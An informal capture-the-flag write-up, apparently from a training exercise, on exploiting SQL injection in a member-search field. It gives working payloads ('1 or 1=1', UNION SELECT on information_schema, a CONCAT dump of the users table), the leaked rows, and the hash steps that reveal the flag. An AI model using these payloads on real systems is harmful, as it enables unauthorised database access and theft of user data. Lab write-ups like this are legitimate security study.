this breach is duo to sql injection vornability in the earch for members input, 
i was able to navigate throught the database and get the database tables and columns

after that i was able to get my hands on the users datatable columns
with that i was first able to get all the users first name and surename using "1 or 1=1"
so the query will end up being like this "select first_name, last_name from users where id = 1 or 1=1"
1 = 1 will resolve to true, after that the query response will get us all the users first_name and last_name

after that i was still not able to get any flage the response was just 
|ID: 1 or 1=1 
First name: one
Surname : me

ID: 1 or 1=1 
First name: two
Surname : me

ID: 1 or 1=1 
First name: three
Surname : me

ID: 1 or 1=1 
First name: Flag
Surname : GetThe|

here we can notice that there is a user with the first name as flag and surname as getthe


after that i was able to use a union operation to retrive all the users columns values
using this query "1 or 1=1 union select 1, CONCAT(user_id, 0x20, first_name, 0x20, last_name, 0x20, town, 0x20, country, 0x20, planet, 0x20, Commentaire, 0x20, countersign) from users"
with that i was able to access the user with id 5 data 
it was : 
user_id | first_name  | last_name    | town   | country   | planet    | Commentaire    | countersign
5       | Flag        | GetThe       | 42 42 42 Decrypt this password -> then lower all the char. Sh256 on it and it's good ! 5ff9d0165b4f92b14994e5c685cdce28

i was not able to make sense of this data but what i ended up shoud be doing is
decrypt 5ff9d0165b4f92b14994e5c685cdce28 (its the encryption of the word FortyTwo using md5 hashing algorithm)
convert the word to all lowercase characters FortyTwo -> fortytwo
and encrypted fortytwo using sh-256 hasing algorithm
so i ended up with 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 as the flag

// retrieve the database tables names
1 union SELECT table_name, table_name FROM information_schema.tables

// retrieve the database tables columns names
1 UNION select table_name, column_name FROM information_schema.columns

// retrive all the data from the users datatable
1 or 1=1 union select 1, CONCAT(user_id, 0x20, first_name, 0x20, last_name, 0x20, town, 0x20, country, 0x20, planet, 0x20, Commentaire, 0x20, countersign) from users